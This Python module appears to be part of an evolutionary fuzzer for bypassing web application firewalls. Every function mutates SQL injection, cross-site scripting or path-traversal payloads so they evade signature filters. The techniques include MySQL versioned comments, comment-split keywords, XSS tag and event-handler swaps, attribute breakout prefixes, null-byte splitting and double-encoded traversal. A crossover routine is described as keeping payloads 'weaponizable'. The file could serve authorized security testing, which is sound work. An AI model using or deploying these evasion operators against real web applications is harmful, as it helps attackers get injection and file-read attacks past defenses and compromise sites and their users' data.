"""
mutations.py
Payload mutation operators. Each function takes a payload string and
returns a slightly modified version. These operators are inspired by the
classic techniques WAF-bypass tooling uses to evade signature-based
detection (SQLMap tamper scripts, XSS filter-bypass lists, etc.) but here
they are selected and applied randomly/evolutionarily.
"""
import random
import re
import urllib.parse


def case_randomize(payload: str) -> str:
    """Randomly flips the case of letters. SELECT -> SeLeCt"""
    return "".join(
        c.upper() if random.random() > 0.5 else c.lower()
        for c in payload
    )


_SQL_KEYWORDS = r"(select|union|from|where|or|and|insert|drop|table)"


def add_sql_comment(payload: str) -> str:
    """Replaces the whitespace immediately ADJACENT to a SQL keyword with /**/
    (NOT SEL/**/ECT, but UNION SELECT -> UNION/**/SELECT). A realistic
    technique: most WAF regexes expect a literal \\s+ between two keywords and
    /**/ breaks that expectation; to a real SQL engine /**/ is just a
    whitespace equivalent and does not corrupt the keyword itself - so the
    exploit keeps working while evading the WAF signature. Injecting a
    comment into the MIDDLE of a keyword (old behavior) was unrealistic: a
    real SQL parser would also break on it, so it was removed."""
    m = re.search(r"\b" + _SQL_KEYWORDS + r"\b\s", payload, re.IGNORECASE)
    if m:
        return payload[: m.end() - 1] + "/**/" + payload[m.end():]
    m = re.search(r"\s\b" + _SQL_KEYWORDS + r"\b", payload, re.IGNORECASE)
    if m:
        return payload[: m.start()] + "/**/" + payload[m.start() + 1:]
    return payload


def url_encode_partial(payload: str) -> str:
    """URL-encodes a single random character of the payload."""
    if not payload:
        return payload
    chars = list(payload)
    idx = random.randint(0, len(chars) - 1)
    chars[idx] = urllib.parse.quote(chars[idx])
    return "".join(chars)


def double_url_encode(payload: str) -> str:
    """URL-encodes the whole payload twice (attempt to defeat a WAF decode layer)."""
    once = urllib.parse.quote(payload)
    return urllib.parse.quote(once)


def add_whitespace_variants(payload: str) -> str:
    """Replaces spaces with a tab, newline, multiple spaces, or a comment."""
    variants = ["\t", "\n", "\r\n", "  ", "/**/"]
    return payload.replace(" ", random.choice(variants))


def add_null_byte(payload: str) -> str:
    """Appends a null byte to the payload (attempt to fool legacy parsers)."""
    return payload + "%00"


def unicode_homoglyph(payload: str) -> str:
    """Replaces some ASCII characters with Unicode look-alikes."""
    homoglyphs = {
        "'": ["ʹ", "＇", "‛"],
        '"': ["＂", "“"],
        "<": ["＜"],
        ">": ["＞"],
        "(": ["（"],
        ")": ["）"],
    }
    chars = list(payload)
    for i, c in enumerate(chars):
        if c in homoglyphs and random.random() > 0.5:
            chars[i] = random.choice(homoglyphs[c])
    return "".join(chars)


def html_entity_encode(payload: str) -> str:
    """Converts characters in XSS payloads to HTML entities."""
    entities = {"<": "&lt;", ">": "&gt;", "'": "&#39;", '"': "&quot;"}
    result = []
    for c in payload:
        if c in entities and random.random() > 0.6:
            result.append(entities[c])
        else:
            result.append(c)
    return "".join(result)


def insert_random_junk(payload: str) -> str:
    """Inserts a harmless junk token at a random position (attempt to break a regex)."""
    junk_chars = ["/**/", "%20", "\t", "()"]
    idx = random.randint(0, len(payload))
    return payload[:idx] + random.choice(junk_chars) + payload[idx:]


def script_null_byte_split(payload: str) -> str:
    """Injects a null byte into the middle of the word 'script' (relies on a
    naive regex searching for 'script' as a whole and not ignoring the null
    byte - a browser/parser may skip the null byte and still read the word as
    'script', while the WAF regex loses the match)."""
    if "script" in payload.lower():
        return payload.lower().replace("script", "scr\x00ipt")
    return payload


def strip_and_reencode(payload: str) -> str:
    """Decodes the payload first, then re-encodes it differently."""
    try:
        decoded = urllib.parse.unquote(payload)
        return urllib.parse.quote(decoded, safe="")
    except Exception:
        return payload


_XSS_EVENTS = ["onerror", "onload", "onmouseover", "onfocus", "onclick", "onpointerover", "ontoggle"]


def xss_event_handler_swap(payload: str) -> str:
    """Swaps an event handler for another (onerror -> onmouseover, ...).
    No-op if the payload has no event handler."""
    def repl(m):
        new = random.choice([e for e in _XSS_EVENTS if e.lower() != m.group(0).lower()])
        return new
    return re.sub(r"on[a-z]+(?=\s*=)", repl, payload, count=1, flags=re.IGNORECASE)


def xss_tag_vector_swap(payload: str) -> str:
    """Swaps the delivery tag/vector while keeping the JS call, e.g.
    <script>alert(1)</script> <-> <img src=x onerror=alert(1)> <-> <svg onload=alert(1)>."""
    m = re.search(r"(?:alert|confirm|prompt)\s*\([^)]*\)", payload, re.IGNORECASE)
    call = m.group(0) if m else "alert(1)"
    vectors = [
        f"<script>{call}</script>",
        f"<img src=x onerror={call}>",
        f"<svg onload={call}>",
        f"<body onload={call}>",
        f"<iframe src=javascript:{call}>",
        f"<details open ontoggle={call}>",
        f"<input autofocus onfocus={call}>",
        f"<select autofocus onfocus={call}>",
    ]
    return random.choice(vectors)


def xss_attr_breakout(payload: str) -> str:
    """Prepends an attribute/tag breakout sequence to escape the reflection
    context (e.g. '\"><svg onload=...>')."""
    prefix = random.choice(['">', "'>", "</title>", "</textarea>", "</script>"])
    return prefix + payload


def xss_entity_obfuscate(payload: str) -> str:
    """Obfuscates 'javascript:' / colon with HTML entities commonly tolerated
    by browsers in attribute/URI contexts."""
    out = payload
    out = re.sub(r"javascript:", "javascript&colon;", out, flags=re.IGNORECASE)
    return out


def lfi_nested_traversal(payload: str) -> str:
    """Rewrites ../ as ....// (defeats naive single-pass '../' stripping)."""
    if "../" in payload or "..\\" in payload:
        return payload.replace("../", "....//").replace("..\\", "....\\\\")
    return payload


def lfi_encode_traversal(payload: str) -> str:
    """URL-encodes the traversal metacharacters (dots/slashes)."""
    return payload.replace("/", "%2f").replace(".", "%2e")


def lfi_double_encode_traversal(payload: str) -> str:
    """Double-encodes traversal (for apps that decode twice)."""
    return payload.replace("/", "%252f").replace(".", "%252e")


def lfi_depth_vary(payload: str) -> str:
    """Adds or removes a traversal level (../ depth fuzzing)."""
    if "../" not in payload:
        return "../" + payload
    if random.random() > 0.5:
        return "../" + payload
    return payload.replace("../", "", 1)


def mysql_versioned_comment(payload: str) -> str:
    """Wraps a SQL keyword in a MySQL versioned comment (/*!50000UNION*/):
    MySQL executes the contents, many WAF regexes miss it."""
    m = re.search(r"\b" + _SQL_KEYWORDS + r"\b", payload, re.IGNORECASE)
    if m:
        kw = m.group(0)
        return payload[:m.start()] + f"/*!50000{kw}*/" + payload[m.end():]
    return payload


_WS_ALT = ["%09", "%0a", "%0c", "%0d", "%a0", "+", "/**/"]


def whitespace_alt(payload: str) -> str:
    """Replaces spaces with alternative whitespace/separators a DB tolerates
    but a naive \\s+ regex may not (tab, newline, form-feed, etc.)."""
    if " " not in payload:
        return payload
    return payload.replace(" ", random.choice(_WS_ALT))


def sql_inline_comment_split(payload: str) -> str:
    """Splits adjacent SQL tokens with an inline comment at a space boundary
    (OR 1 -> OR/**/1), keeping the query valid while breaking the signature."""
    return payload.replace(" ", "/**/", 1) if " " in payload else payload


ALL_MUTATIONS = [
    case_randomize,
    add_sql_comment,
    url_encode_partial,
    double_url_encode,
    add_whitespace_variants,
    add_null_byte,
    unicode_homoglyph,
    html_entity_encode,
    insert_random_junk,
    script_null_byte_split,
    strip_and_reencode,
    xss_event_handler_swap,
    xss_tag_vector_swap,
    xss_attr_breakout,
    xss_entity_obfuscate,
    mysql_versioned_comment,
    whitespace_alt,
    sql_inline_comment_split,
    lfi_nested_traversal,
    lfi_encode_traversal,
    lfi_double_encode_traversal,
    lfi_depth_vary,
]


OPERATORS_BY_CATEGORY = {
    "xss": [
        case_randomize, add_whitespace_variants, insert_random_junk,
        html_entity_encode, url_encode_partial, script_null_byte_split,
        xss_event_handler_swap, xss_tag_vector_swap, xss_attr_breakout,
        xss_entity_obfuscate,
    ],
    "sqli": [
        case_randomize, add_sql_comment, add_whitespace_variants,
        url_encode_partial, insert_random_junk, unicode_homoglyph,
        script_null_byte_split, add_null_byte, double_url_encode,
        strip_and_reencode, mysql_versioned_comment, whitespace_alt,
        sql_inline_comment_split,
    ],
    "lfi": [
        lfi_nested_traversal, lfi_encode_traversal, lfi_double_encode_traversal,
        lfi_depth_vary, url_encode_partial, add_null_byte, case_randomize,
        insert_random_junk, strip_and_reencode,
    ],
    "generic": ALL_MUTATIONS,
}


def operators_for(category: str):
    """Return the mutation operators suited to a category (keeps XSS payloads
    from being shredded by SQL operators, and vice versa)."""
    return OPERATORS_BY_CATEGORY.get(category, ALL_MUTATIONS)


def mutate(payload: str, operators=None, weights=None) -> str:
    """Applies a random mutation operator. If `operators` is given, only picks
    from that subset. If `weights` (name->float) is given, selection is
    weighted - used to favor operators known to help against a detected WAF."""
    ops = operators if operators else ALL_MUTATIONS
    if weights:
        w = [weights.get(o.__name__, 1.0) for o in ops]
        op = random.choices(ops, weights=w, k=1)[0]
    else:
        op = random.choice(ops)
    try:
        return op(payload)
    except Exception:
        return payload


_TOKEN_SPLIT = re.compile(r"(\s+|[(),;=<>'\"]|/\*\*/|--|#)")


def _token_boundaries(s: str):
    """Indices that fall on token boundaries, so a cut keeps whole tokens
    intact instead of slicing through the middle of a keyword/number."""
    bounds = {0, len(s)}
    pos = 0
    for part in _TOKEN_SPLIT.split(s):
        if part:
            pos += len(part)
            bounds.add(pos)
    return sorted(bounds)


def crossover(parent1: str, parent2: str) -> str:
    """Grammar-aware crossover: splices two payloads at token boundaries so
    offspring stay closer to valid syntax (and thus remain weaponizable,
    not just error-triggering)."""
    if not parent1 or not parent2:
        return parent1 or parent2 or ""
    b1 = _token_boundaries(parent1)
    b2 = _token_boundaries(parent2)
    split1 = random.choice(b1)
    split2 = random.choice(b2)
    return parent1[:split1] + parent2[split2:]
